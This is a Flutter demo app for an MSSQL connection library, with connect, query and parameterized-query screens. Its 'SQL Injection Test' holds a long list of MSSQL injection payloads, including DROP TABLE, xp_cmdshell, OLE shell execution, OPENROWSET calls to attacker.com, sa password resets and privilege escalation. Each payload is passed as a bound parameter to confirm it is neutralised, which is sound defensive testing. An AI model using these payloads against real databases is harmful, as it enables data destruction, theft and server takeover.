import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_toast_message_bar/toast_message_bar.dart';
import 'package:mssql_connection/mssql_connection.dart';

void main() {
  runApp(const MyApp());
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  @override
  void initState() {
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
        debugShowCheckedModeBanner: false, home: HomPage());
  }
}

const textStyle = TextStyle(fontSize: 18);

class HomPage extends StatefulWidget {
  const HomPage({super.key});

  @override
  State<HomPage> createState() => _HomPageState();
}

class _HomPageState extends State<HomPage> {
  String ip = '',
      port = '',
      username = '',
      password = '',
      databaseName = '',
      readQuery = '',
      writeQuery = '',
      paramQuery = '',
      param1 = '',
      param2 = '',
      param3 = '';
  final _sqlConnection = MssqlConnection.getInstance();
  final pageController = PageController();

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('SQL Connection Example'),
      ),
      body: PageView(
        controller: pageController,
        children: [
          SingleChildScrollView(
            child: Padding(
              padding: const EdgeInsets.all(10.0),
              child: Column(children: [
                Row(children: [
                  Flexible(
                      child: customTextField("IP address",
                          onchanged: (p0) => ip = p0,
                          keyboardType: TextInputType.text)),
                  const SizedBox(width: 10),
                  Flexible(
                      child: customTextField("Port",
                          onchanged: (p0) => port = p0,
                          keyboardType: TextInputType.number))
                ]),
                customTextField("Database Name",
                    onchanged: (p0) => databaseName = p0),
                customTextField("Username", onchanged: (p0) => username = p0),
                customTextField("Password", onchanged: (p0) => password = p0),
                const SizedBox(height: 15.0),
                FloatingActionButton.extended(
                    onPressed: connect, label: const Text("Connect"))
              ]),
            ),
          ),
          SingleChildScrollView(
            child: Padding(
              padding: const EdgeInsets.all(10.0),
              child: Column(
                children: [
                  Card(
                    child: Padding(
                      padding: const EdgeInsets.all(10.0),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Row(
                            mainAxisAlignment: MainAxisAlignment.spaceBetween,
                            children: [
                              const Text("Read Data", style: textStyle),
                              IconButton(
                                  onPressed: () => execute("Read", context),
                                  icon: const Icon(Icons.play_arrow_rounded))
                            ],
                          ),
                          customTextField('query',
                              onchanged: (p0) => readQuery = p0,
                              autovalidateMode: false,
                              enableLabel: false)
                        ],
                      ),
                    ),
                  ),
                  const SizedBox(height: 10),
                  Card(
                    child: Padding(
                      padding: const EdgeInsets.all(10.0),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Row(
                            mainAxisAlignment: MainAxisAlignment.spaceBetween,
                            children: [
                              const Text("Write Data", style: textStyle),
                              IconButton(
                                  onPressed: () => execute("write", context),
                                  icon: const Icon(Icons.play_arrow_rounded))
                            ],
                          ),
                          customTextField('query',
                              onchanged: (p0) => writeQuery = p0,
                              autovalidateMode: false,
                              enableLabel: false)
                        ],
                      ),
                    ),
                  ),
                  Card(
                    color: Colors.green.shade50,
                    child: Padding(
                      padding: const EdgeInsets.all(10.0),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Row(
                            mainAxisAlignment: MainAxisAlignment.spaceBetween,
                            children: [
                              const Text("🔒 Parameterized Query (Secure)", 
                                style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
                              IconButton(
                                  onPressed: () => execute("parameterized", context),
                                  icon: const Icon(Icons.security, color: Colors.green))
                            ],
                          ),
                          const Text("Use ? for parameters", 
                            style: TextStyle(fontSize: 12, color: Colors.grey)),
                          customTextField('SQL with ? placeholders',
                              onchanged: (p0) => paramQuery = p0,
                              autovalidateMode: false,
                              enableLabel: false),
                          const SizedBox(height: 8),
                          Row(children: [
                            Expanded(child: customTextField('Param 1',
                                onchanged: (p0) => param1 = p0,
                                autovalidateMode: false)),
                            const SizedBox(width: 8),
                            Expanded(child: customTextField('Param 2',
                                onchanged: (p0) => param2 = p0,
                                autovalidateMode: false)),
                            const SizedBox(width: 8),
                            Expanded(child: customTextField('Param 3',
                                onchanged: (p0) => param3 = p0,
                                autovalidateMode: false)),
                          ]),
                        ],
                      ),
                    ),
                  ),
                  const SizedBox(height: 10),
                  Card(
                    color: Colors.blue.shade50,
                    child: Padding(
                      padding: const EdgeInsets.all(10.0),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          const Text("🧪 Quick Test Buttons", 
                            style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
                          const SizedBox(height: 8),
                          Wrap(
                            spacing: 8,
                            children: [
                              ElevatedButton(
                                onPressed: () => runQuickTest("create_table"),
                                child: const Text("Create Test Table"),
                              ),
                              ElevatedButton(
                                onPressed: () => runQuickTest("insert_test"),
                                child: const Text("Insert Test Data"),
                              ),
                              ElevatedButton(
                                onPressed: () => runQuickTest("select_test"),
                                child: const Text("Select Test"),
                              ),
                              ElevatedButton(
                                onPressed: () => runQuickTest("injection_test"),
                                child: const Text("SQL Injection Test"),
                              ),
                            ],
                          ),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  TextFormField customTextField(String title,
          {void Function(String)? onchanged,
          TextInputType? keyboardType,
          bool autovalidateMode = true,
          bool enableLabel = true}) =>
      TextFormField(
        autocorrect: true,
        autovalidateMode:
            autovalidateMode ? AutovalidateMode.onUserInteraction : null,
        inputFormatters: [
          if (title == "Port") ...[
            FilteringTextInputFormatter.digitsOnly,
            LengthLimitingTextInputFormatter(4)
          ]
        ],
        keyboardType: keyboardType,
        onChanged: onchanged,
        decoration: InputDecoration(
            border: title == "Port" || title == "IP address"
                ? const OutlineInputBorder()
                : null,
            hintText: "Enter $title ${title == "Port" ? "number" : ""}",
            labelText: enableLabel ? title : null),
        validator: (value) {
          if (value!.isEmpty) {
            return "Please Enter $title";
          }
          return null;
        },
      );

  connect() async {
    if (ip.isEmpty ||
        port.isEmpty ||
        databaseName.isEmpty ||
        username.isEmpty ||
        password.isEmpty) {
      toastMessage("Please enter all fields", color: Colors.redAccent);

      return;
    }
    _sqlConnection
        .connect(
            ip: ip,
            port: port,
            databaseName: databaseName,
            username: username,
            password: password)
        .then((value) {
      if (value) {
        toastMessage("Connection Established", color: Colors.green);
        pageController.nextPage(
            duration: const Duration(milliseconds: 500),
            curve: Curves.easeInOut);
      } else {
        toastMessage("Connection Failed", color: Colors.redAccent);
      }
    }).onError((e, st) {
      toastMessage(e.toString(), color: Colors.redAccent);
    });
  }

  Future<void> toastMessage(String message,
      {Color color = Colors.blueAccent, String title = ""}) async {
    /// ignore: use_build_context_synchronously
    await ToastMessageBar(
      //Add background color for your toast message
      backgroundColor: color,

      //Add title for your toast message
      title: color == Colors.blueAccent
          ? "INFO"
          : color == Colors.redAccent
              ? "ERROR"
              : color == Colors.green
                  ? "SUCCESS"
                  : title,

      //Add title color for your toast
      titleColor: Colors.white,

      //Add message for your toast
      message: message,

      //Add message color for your toast message
      messageColor: Colors.white,

      //Add duration to display the message
      duration: const Duration(seconds: 7),
    ).show(context);
  }

  execute(String s, BuildContext context) async {
    try {
      if (s == "Read") {
        if (readQuery.isEmpty) {
          toastMessage("Empty query", color: Colors.redAccent);
          return;
        }
        print(readQuery);
        showProgress(context);
        var startTime = DateTime.now();
        var result = await _sqlConnection.getData(readQuery);
        var difference = DateTime.now().difference(startTime);
        if (!mounted) return;
        hideProgress(context);
        print(
            "Duration: $difference and RecordCount:${jsonDecode(result).length}");
        toastMessage(
            "Total Records Count:${jsonDecode(result).length}.\n Duration: $difference");
        // print(result.toString());
      } else if (s == "write") {
        if (writeQuery.isEmpty) {
          toastMessage("Empty query", color: Colors.redAccent);
          return;
        }
        showProgress(context);
        var startTime = DateTime.now();
        var result = await _sqlConnection.writeData(writeQuery);
        var difference = DateTime.now().difference(startTime);
        if (!mounted) return;
        hideProgress(context);
        print("Duration: ${DateTime.now().difference(startTime)} ");
        print(result.toString());
        toastMessage(
            "Please check the console for data.\n Duration: $difference");
      } else if (s == "parameterized") {
        if (paramQuery.isEmpty) {
          toastMessage("Empty parameterized query", color: Colors.redAccent);
          return;
        }
        
        // Build parameters list (only non-empty parameters)
        List<String> params = [];
        if (param1.isNotEmpty) params.add(param1);
        if (param2.isNotEmpty) params.add(param2);
        if (param3.isNotEmpty) params.add(param3);
        
        print("Executing parameterized query: $paramQuery");
        print("Parameters: $params");
        showProgress(context, "Executing secure query...");
        var startTime = DateTime.now();
        
        var result = await _sqlConnection.executeParameterizedQuery(paramQuery, params);
        var difference = DateTime.now().difference(startTime);
        
        if (!mounted) return;
        hideProgress(context);
        
        print("Duration: $difference");
        print("Result: $result");
        
        // Check if result is JSON (SELECT query) or simple string (INSERT/UPDATE/DELETE)
        try {
          var jsonResult = jsonDecode(result.toString());
          if (jsonResult is List) {
            toastMessage(
                "✅ Query executed securely!\nRecords: ${jsonResult.length}\nDuration: $difference");
          } else {
            toastMessage(
                "✅ Query executed securely!\nResult: $result\nDuration: $difference");
          }
        } catch (e) {
          toastMessage(
              "✅ Query executed securely!\nResult: $result\nDuration: $difference");
        }
      }
    } catch (e) {
      hideProgress(context);
      toastMessage(e.toString(), color: Colors.redAccent);
    }
  }

  runQuickTest(String testType) async {
    try {
      showProgress(context, "Running $testType...");
      String result = "";
      
      switch (testType) {
        case "create_table":
          print("🔨 Creating TestUsers table...");
          result = await _sqlConnection.executeParameterizedQuery(
            "IF NOT EXISTS (SELECT * FROM sysobjects WHERE name='TestUsers' AND xtype='U') CREATE TABLE TestUsers (id INT IDENTITY(1,1) PRIMARY KEY, username NVARCHAR(50), email NVARCHAR(100), age INT)",
            []
          );
          print("📋 Table creation result: $result");
          testType = "Created TestUsers table with ID, username, email, and age columns";
          break;
          
        case "insert_test":
          print("➕ Inserting test data...");
          // First ensure the table exists
          await _sqlConnection.executeParameterizedQuery(
            "IF NOT EXISTS (SELECT * FROM sysobjects WHERE name='TestUsers' AND xtype='U') CREATE TABLE TestUsers (id INT IDENTITY(1,1) PRIMARY KEY, username NVARCHAR(50), email NVARCHAR(100), age INT)",
            []
          );
          result = await _sqlConnection.executeParameterizedQuery(
            "INSERT INTO TestUsers (username, email, age) VALUES (?, ?, ?)",
            ["test_user_${DateTime.now().millisecondsSinceEpoch}", "test@example.com", "25"]
          );
          print("📝 Insert result: $result");
          testType = "Inserted test user with random username and age 25";
          break;
          
        case "select_test":
          print("🔍 Selecting test data...");
          // First ensure the table exists
          await _sqlConnection.executeParameterizedQuery(
            "IF NOT EXISTS (SELECT * FROM sysobjects WHERE name='TestUsers' AND xtype='U') CREATE TABLE TestUsers (id INT IDENTITY(1,1) PRIMARY KEY, username NVARCHAR(50), email NVARCHAR(100), age INT)",
            []
          );
          result = await _sqlConnection.executeParameterizedQuery(
            "SELECT TOP 5 * FROM TestUsers WHERE age > ?",
            ["20"]
          );
          print("📊 Select result: $result");
          testType = "Queried users older than 20 years (TOP 5)";
          break;
          
        case "injection_test":
          print("🛡️ Testing comprehensive MSSQL injection prevention...");
          try {
            // First ensure the table exists
            print("📋 Creating test table if it doesn't exist...");
            await _sqlConnection.executeParameterizedQuery(
              "IF NOT EXISTS (SELECT * FROM sysobjects WHERE name='TestUsers' AND xtype='U') CREATE TABLE TestUsers (id INT IDENTITY(1,1) PRIMARY KEY, username NVARCHAR(50), email NVARCHAR(100), age INT)",
              []
            );
            print("✅ Test table ready");
          
          // Test multiple MSSQL-specific injection techniques
          List<String> maliciousInputs = [
            // === BASIC INJECTION ATTEMPTS ===
            "'; DROP TABLE TestUsers; --",
            "' OR '1'='1",
            "' UNION SELECT null--",
            "' UNION SELECT @@version--",
            "' UNION SELECT DB_NAME()--",
            "' UNION SELECT USER_NAME()--",
            
            // === ENCODING BYPASS ATTACKS ===
            "%27; DROP TABLE TestUsers; --%00", // URL encoded with null byte
            "%2527; DROP TABLE TestUsers; --%00", // Double URL encoded
            "&#39;; DROP TABLE TestUsers; --", // HTML entity encoded
            "%u0027; DROP TABLE TestUsers; --", // Unicode encoded
            "%27 OR %271%27=%271", // URL encoded OR condition
            "%2527 OR %25271%2527=%25271", // Double URL encoded
            
            // === WHITESPACE BYPASS ATTACKS ===
            "'%09UNION%09SELECT%09null--", // Tab characters
            "'%0AUNION%0ASELECT%0Anull--", // Line feed
            "'%0DUNION%0DSELECT%0Dnull--", // Carriage return
            "'%0CUNION%0CSELECT%0Cnull--", // Form feed
            "'%0BUNION%0BSELECT%0Bnull--", // Vertical tab
            "'%A0UNION%A0SELECT%A0null--", // Non-breaking space
            "'%20UNION%20SELECT%20null--", // Regular space
            
            // === COMMENT VARIATION ATTACKS ===
            "'; DROP TABLE TestUsers#", // Hash comment
            "'; DROP TABLE TestUsers/**/", // Empty comment
            "'; DROP TABLE TestUsers/*comment*/", // Comment with text
            "'; DROP TABLE TestUsers/*! */", // MySQL-style comment
            
            // === CASE MANIPULATION ATTACKS ===
            "'; dRoP tAbLe TestUsers; --",
            "'; UnIoN sElEcT @@version; --",
            "'; eXeC xp_cmdshell 'dir'; --",
            "'; wAiTfOr DeLaY '00:00:05'; --",
            
            // === STRING CONCATENATION BYPASS ===
            "'; DROP TABLE Test'+'Users; --", // String concatenation
            "'; EXEC('DROP TABLE TestUsers'); --", // Dynamic execution
            "'; DECLARE @sql NVARCHAR(MAX); SET @sql = 'DROP TABLE TestUsers'; EXEC(@sql); --",
            
            // === CHAR/ASCII BYPASS ATTACKS ===
            "'; EXEC(CHAR(68)+CHAR(82)+CHAR(79)+CHAR(80)+CHAR(32)+CHAR(84)+CHAR(65)+CHAR(66)+CHAR(76)+CHAR(69)+CHAR(32)+CHAR(84)+CHAR(101)+CHAR(115)+CHAR(116)+CHAR(85)+CHAR(115)+CHAR(101)+CHAR(114)+CHAR(115)); --", // DROP TABLE TestUsers in CHAR
            "'; SELECT CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110); --", // 'admin' in CHAR
            
            // === TIME-BASED BLIND INJECTION ===
            "'; WAITFOR DELAY '00:00:05'; --",
            "'; IF (1=1) WAITFOR DELAY '00:00:03'; --",
            "'; IF (ASCII(SUBSTRING(@@version,1,1))>64) WAITFOR DELAY '00:00:03'; --",
            "'; IF (LEN((SELECT TOP 1 name FROM sysdatabases))>5) WAITFOR DELAY '00:00:03'; --",
            "'; IF EXISTS(SELECT * FROM sysobjects WHERE name='TestUsers') WAITFOR DELAY '00:00:03'; --",
            
            // === ERROR-BASED INJECTION ===
            "'; SELECT 1/0; --",
            "'; SELECT CONVERT(int, @@version); --",
            "'; SELECT CAST(@@version AS int); --",
            "'; SELECT 1/(SELECT COUNT(*) FROM sysobjects WHERE name='nonexistent'); --",
            "'; SELECT CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')); --",
            
            // === INFORMATION GATHERING ===
            "'; SELECT @@version; --",
            "'; SELECT DB_NAME(); --",
            "'; SELECT USER_NAME(); --",
            "'; SELECT @@SERVERNAME; --",
            "'; SELECT @@SERVICENAME; --",
            "'; SELECT * FROM INFORMATION_SCHEMA.ROUTINES; --",
            "'; SELECT * FROM INFORMATION_SCHEMA.PARAMETERS; --",
            "'; SELECT * FROM sys.sql_modules; --",
            "'; SELECT name FROM sysobjects WHERE xtype='U'; --",
            "'; SELECT name FROM sysdatabases; --",
            "'; SELECT name FROM sysusers; --",
            "'; SELECT name FROM syscolumns WHERE id=OBJECT_ID('TestUsers'); --",
            
            // === UNION-BASED ATTACKS ===
            "'; UNION SELECT null,null,null--",
            "'; UNION SELECT @@version,null,null--",
            "'; UNION SELECT DB_NAME(),null,null--",
            "'; UNION SELECT USER_NAME(),null,null--",
            "'; UNION SELECT * FROM (SELECT TOP 1 * FROM (SELECT TOP 1 * FROM sysobjects) AS a) AS b; --",
            "'; WITH cte AS (SELECT name FROM sysobjects) SELECT * FROM cte; --", // CTE injection
            
            // === STACKED QUERIES ===
            "'; INSERT INTO TestUsers (username, email, age) VALUES ('hacked', 'hacked@evil.com', 0); --",
            "'; UPDATE TestUsers SET username='hacked' WHERE id=1; --",
            "'; DELETE FROM TestUsers WHERE id=1; --",
            "'; BEGIN TRANSACTION; DELETE FROM TestUsers; ROLLBACK; --",
            "'; BEGIN TRANSACTION; UPDATE TestUsers SET username='hacked'; COMMIT; --",
            
            // === EXTENDED STORED PROCEDURES ===
            "'; EXEC xp_cmdshell 'dir'; --",
            "'; EXEC xp_dirtree 'C:\\'; --",
            "'; EXEC xp_fileexist 'C:\\Windows\\System32\\cmd.exe'; --",
            
            // === OLE AUTOMATION ===
            "'; DECLARE @result int; EXEC sp_OACreate 'WScript.Shell', @result OUTPUT; --",
            "'; DECLARE @result int; EXEC sp_OAMethod @result, 'Run', null, 'cmd.exe /c dir'; --",
            
            // === XML-BASED ATTACKS ===
            "'; SELECT * FROM TestUsers FOR XML AUTO; --",
            "'; SELECT * FROM TestUsers FOR XML PATH; --",
            "'; SELECT * FROM TestUsers FOR XML EXPLICIT; --",
            "'; DECLARE @xml XML; SET @xml = '<root>evil</root>'; SELECT @xml.value('(/root)[1]', 'varchar(100)'); --",
            "'; SELECT CAST('<root><child>data</child></root>' AS XML).query('/root/child'); --",
            
            // === DNS EXFILTRATION ===
            "'; SELECT * FROM OPENROWSET('MSDASQL','DRIVER={SQL Server};SERVER=attacker.com;UID=sa;PWD=;','SELECT @@version'); --",
            "'; SELECT * FROM OPENDATASOURCE('SQLOLEDB','Data Source=attacker.com;User ID=sa;Password=').master.dbo.sysdatabases; --",
            
            // === PRIVILEGE ESCALATION ===
            "'; EXEC sp_addsrvrolemember 'everyone', 'sysadmin'; --",
            "'; EXEC sp_addrolemember 'db_owner', 'public'; --",
            "'; EXEC sp_password null, 'newpass', 'sa'; --",
            
            // === HEAVY QUERIES (DoS attempts) ===
            "'; SELECT COUNT(*) FROM sysobjects a, sysobjects b, sysobjects c; --", // Cartesian product DoS
            "'; WAITFOR DELAY '00:00:30'; --", // Long delay DoS
            "'; WHILE(1=1) BEGIN SELECT @@version END; --", // Infinite loop
            "'; WITH recursive_cte(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM recursive_cte WHERE n < 10000) SELECT * FROM recursive_cte OPTION (MAXRECURSION 0); --", // Recursive CTE
            
            // === ADVANCED SYSTEM QUERIES ===
            "'; SELECT loginname FROM master..sysprocesses; --",
            "'; SELECT name FROM master..sysdatabases WHERE name NOT IN ('master','tempdb','model','msdb'); --",
            "'; SELECT @@SERVERNAME, @@SERVICENAME; --",
            "'; SELECT SERVERPROPERTY('MachineName'); --",
            "'; SELECT SERVERPROPERTY('InstanceName'); --",
            "'; SELECT * FROM sys.credentials; --",
            "'; SELECT name FROM sys.server_principals WHERE type = 'C'; --",
            
            // === BULK OPERATIONS ===
            "'; BULK INSERT TestUsers FROM 'c:\\temp\\evil.txt'; --",
            "'; SELECT * INTO TempHacked FROM TestUsers; --",
            
            // === BACKUP/RESTORE ATTACKS ===
            "'; BACKUP DATABASE master TO DISK='c:\\temp\\stolen.bak'; --",
            "'; RESTORE DATABASE evil FROM DISK='c:\\temp\\malicious.bak'; --",
            
            // === SERVICE BROKER ATTACKS ===
            "'; CREATE QUEUE EvilQueue; --",
            "'; CREATE SERVICE EvilService ON QUEUE EvilQueue; --",
            
            // === AGENT JOB MANIPULATION ===
            "'; EXEC msdb.dbo.sp_add_job @job_name = 'EvilJob'; --",
            "'; EXEC msdb.dbo.sp_add_jobstep @job_name = 'EvilJob', @step_name = 'EvilStep', @command = 'cmd.exe /c dir'; --",
            
            // === TRACE/PROFILER MANIPULATION ===
            "'; EXEC sp_trace_create @traceid OUTPUT; --",
            "'; SELECT * FROM fn_trace_getinfo(1); --",
            
            // === FULL-TEXT SEARCH ATTACKS ===
            "'; SELECT * FROM sys.fulltext_catalogs; --",
            "'; SELECT FULLTEXTCATALOGPROPERTY('catalog', 'ItemCount'); --",
            
            // === PARTITION FUNCTION ATTACKS ===
            "'; SELECT * FROM sys.partition_functions; --",
            "'; SELECT * FROM sys.partition_schemes; --",
            
            // === COMPUTED COLUMN ATTACKS ===
            "'; ALTER TABLE TestUsers ADD computed_col AS (SELECT @@version); --",
            
            // === GEOMETRY/GEOGRAPHY ATTACKS ===
            "'; SELECT geometry::STGeomFromText('POINT(1 1)', 0); --",
            
            // === HIERARCHYID ATTACKS ===
            "'; SELECT CAST('/1/2/3/' AS hierarchyid); --",
            
            // === JSON ATTACKS (SQL Server 2016+) ===
            "'; SELECT JSON_VALUE('{\"name\":\"evil\"}', '\$.name'); --",
            "'; SELECT * FROM OPENJSON('{\"users\":[{\"name\":\"admin\",\"pass\":\"secret\"}]}'); --",
            
            // === CURSOR-BASED ATTACKS ===
            "'; DECLARE cursor_name CURSOR FOR SELECT name FROM sysobjects; OPEN cursor_name; --",
            
            // === FUNCTION INJECTION ===
            "'; SELECT dbo.fn_listextendedproperty(default,default,default,default,default,default,default); --",
            "'; SELECT OBJECT_NAME(@@PROCID); --",
            "'; SELECT APP_NAME(); --",
            "'; SELECT HOST_NAME(); --",
            "'; SELECT CONNECTIONPROPERTY('protocol_type'); --",
            
            // === METADATA EXTRACTION ===
            "'; SELECT * FROM sys.triggers; --",
            "'; SELECT * FROM sys.foreign_keys; --",
            "'; SELECT * FROM sys.check_constraints; --",
            "'; SELECT * FROM sys.filegroups WHERE type = 'FD'; --", // FILESTREAM
            "'; SELECT * FROM sys.filetables; --",
            
            // === ASSEMBLY/CLR ATTACKS (if enabled) ===
            "'; CREATE ASSEMBLY evil FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000; --",
          ];
          
          print("🚀 Starting injection test with ${maliciousInputs.length} attack vectors");
          
          int safeCount = 0;
          int totalTests = maliciousInputs.length;
          
          print("🔄 Starting to test ${maliciousInputs.length} attack vectors...");
          
          // Test all comprehensive attack vectors
          print("🧪 Testing comprehensive attack suite with ${maliciousInputs.length} vectors...");
          
          for (int i = 0; i < maliciousInputs.length; i++) {
            String maliciousInput = maliciousInputs[i];
            print("🔍 Testing attack #${i + 1}/${maliciousInputs.length}: ${maliciousInput.length > 30 ? maliciousInput.substring(0, 30) + '...' : maliciousInput}");
            try {
              // Test each malicious input with parameterized query
              var testResult = await _sqlConnection.executeParameterizedQuery(
                "SELECT * FROM TestUsers WHERE username = ?",
                [maliciousInput]
              );
              safeCount++;
              print("✅ Safely handled attack #${i + 1}");
            } catch (e) {
              print("❌ FAILED attack #${i + 1}: $e");
            }
          }
          
          print("📊 Comprehensive test completed: $safeCount/${maliciousInputs.length} safely handled");
          
          result = "Comprehensive test completed: $safeCount/${maliciousInputs.length} safely handled.";
          print("🔒 Injection test completed!");
          print("📊 Results: $safeCount/${maliciousInputs.length} attacks safely neutralized");
          testType = "Comprehensive MSSQL injection prevention test";
          
          // Show detailed results in modal
          print("🔍 Attempting to show modal with results: $safeCount/${maliciousInputs.length}");
          if (mounted) {
            try {
              // Use a slight delay to ensure the context is ready
              Future.delayed(Duration(milliseconds: 100), () {
                if (mounted) {
                  _showInjectionTestResults(context, safeCount, maliciousInputs.length, maliciousInputs);
                  print("✅ Modal should be displayed");
                }
              });
            } catch (e) {
              print("❌ Error showing modal: $e");
            }
          } else {
            print("❌ Widget not mounted, cannot show modal");
          }
        } catch (e) {
          print("🚨 ERROR in injection test: $e");
          print("🚨 Stack trace: ${StackTrace.current}");
          result = "Injection test failed: ${e.toString()}";
          testType = "Injection test failed";
        }
        break;
      }
      
      if (!mounted) return;
      hideProgress(context);
      
      print("Quick test result: $result");
      
      // Parse and display detailed results
      try {
        // Check if this was an error result
        if (result.toString().contains("failed") || result.toString().contains("error") || result.toString().contains("Failed")) {
          toastMessage("❌ $testType\n$result", color: Colors.redAccent);
        } else {
          var jsonResult = jsonDecode(result.toString());
          if (jsonResult is List) {
            if (jsonResult.isEmpty) {
              toastMessage("✅ $testType completed!\nNo records found", color: Colors.green);
            } else {
              toastMessage("✅ $testType completed!\nFound ${jsonResult.length} records", color: Colors.green);
            }
          } else {
            toastMessage("✅ $testType completed!\nResult: $result", color: Colors.green);
          }
        }
      } catch (e) {
        // Not JSON, show as string
        if (result.toString().contains("failed") || result.toString().contains("error") || result.toString().contains("Failed")) {
          toastMessage("❌ $testType\n$result", color: Colors.redAccent);
        } else if (result.toString().isEmpty) {
          toastMessage("✅ $testType completed!\nOperation successful", color: Colors.green);
        } else {
          toastMessage("✅ $testType completed!\nResult: $result", color: Colors.green);
        }
      }
      
    } catch (e) {
      hideProgress(context);
      print("🚨 ERROR in runQuickTest: $e");
      print("🚨 Stack trace: ${StackTrace.current}");
      toastMessage("❌ $testType failed: ${e.toString()}", color: Colors.redAccent);
    }
  }

  showProgress(BuildContext context,
          [String alertMessage = "Fetching Data..."]) async =>
      await showDialog(
          context: context,
          builder: (context) => AlertDialog(
                content: Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    const SizedBox.square(
                        dimension: 35, child: CircularProgressIndicator()),
                    const SizedBox(width: 12),
                    Text(
                      alertMessage,
                      style: const TextStyle(fontSize: 20),
                    )
                  ],
                ),
              ));

  hideProgress(BuildContext context) {
    Navigator.pop(context);
  }

  void _showInjectionTestResults(BuildContext context, int safeCount, int totalTests, List<String> maliciousInputs) {
    print("🎯 _showInjectionTestResults called with: $safeCount/$totalTests");
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (BuildContext context) {
        return AlertDialog(
          title: Row(
            children: [
              Icon(Icons.security, color: Colors.green),
              SizedBox(width: 8),
              Text('SQL Injection Test Results'),
            ],
          ),
          content: SingleChildScrollView(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  padding: EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: safeCount == totalTests ? Colors.green.shade50 : Colors.orange.shade50,
                    borderRadius: BorderRadius.circular(8),
                    border: Border.all(
                      color: safeCount == totalTests ? Colors.green : Colors.orange,
                    ),
                  ),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        'Security Status',
                        style: TextStyle(
                          fontWeight: FontWeight.bold,
                          fontSize: 16,
                          color: safeCount == totalTests ? Colors.green.shade800 : Colors.orange.shade800,
                        ),
                      ),
                      SizedBox(height: 8),
                      Text(
                        safeCount == totalTests 
                          ? '✅ ALL ATTACKS SAFELY NEUTRALIZED'
                          : '⚠️ ${totalTests - safeCount} ATTACKS NEED ATTENTION',
                        style: TextStyle(
                          fontWeight: FontWeight.bold,
                          fontSize: 14,
                        ),
                      ),
                      SizedBox(height: 4),
                      Text('Success Rate: ${((safeCount / totalTests) * 100).toStringAsFixed(1)}%'),
                      Text('Safely Handled: $safeCount/$totalTests'),
                    ],
                  ),
                ),
                SizedBox(height: 16),
                Text(
                  'Attack Categories Tested:',
                  style: TextStyle(fontWeight: FontWeight.bold, fontSize: 14),
                ),
                SizedBox(height: 8),
                _buildAttackCategory('🕐 Time-based Blind Injection', ['WAITFOR DELAY', 'Conditional delays']),
                _buildAttackCategory('❌ Error-based Injection', ['CONVERT/CAST', 'Type conversion errors']),
                _buildAttackCategory('📊 Information Gathering', ['@@version', 'DB_NAME()', 'USER_NAME()']),
                _buildAttackCategory('🔗 Union-based Attacks', ['UNION SELECT', 'System tables']),
                _buildAttackCategory('📝 Stacked Queries', ['INSERT', 'UPDATE', 'DELETE']),
                _buildAttackCategory('⚡ Extended Procedures', ['xp_cmdshell', 'xp_dirtree', 'xp_fileexist']),
                _buildAttackCategory('🔧 OLE Automation', ['sp_OACreate', 'sp_OAMethod']),
                _buildAttackCategory('📄 XML-based Attacks', ['FOR XML AUTO', 'FOR XML PATH']),
                _buildAttackCategory('🌐 DNS Exfiltration', ['xp_dirtree', 'Out-of-band']),
                _buildAttackCategory('👑 Privilege Escalation', ['sp_addsrvrolemember', 'sp_addlogin']),
                _buildAttackCategory('🔍 System Information', ['sys.syslogins', 'sys.server_principals']),
                _buildAttackCategory('⚙️ Advanced Techniques', ['Dynamic SQL', 'Conditional logic']),
                SizedBox(height: 16),
                Text(
                  'Test Summary:',
                  style: TextStyle(fontWeight: FontWeight.bold, fontSize: 14),
                ),
                SizedBox(height: 4),
                Text('• Total attack vectors tested: $totalTests'),
                Text('• Parameterized queries used for all tests'),
                Text('• Each attack was treated as literal string data'),
                Text('• No SQL code was executed from malicious inputs'),
                if (safeCount == totalTests)
                  Text('• ✅ All MSSQL injection techniques safely handled', 
                    style: TextStyle(color: Colors.green, fontWeight: FontWeight.bold)),
              ],
            ),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.of(context).pop(),
              child: Text('Close'),
            ),
            ElevatedButton(
              onPressed: () {
                Navigator.of(context).pop();
                // Show detailed attack list
                _showDetailedAttackList(context, maliciousInputs);
              },
              child: Text('View Attack Details'),
            ),
          ],
        );
      },
    );
  }

  Widget _buildAttackCategory(String title, List<String> techniques) {
    return Padding(
      padding: EdgeInsets.symmetric(vertical: 2),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text('• ', style: TextStyle(fontWeight: FontWeight.bold)),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(title, style: TextStyle(fontWeight: FontWeight.w500)),
                Padding(
                  padding: EdgeInsets.only(left: 8),
                  child: Text(techniques.join(', '), 
                    style: TextStyle(fontSize: 12, color: Colors.grey.shade600)),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  void _showDetailedAttackList(BuildContext context, List<String> maliciousInputs) {
    showDialog(
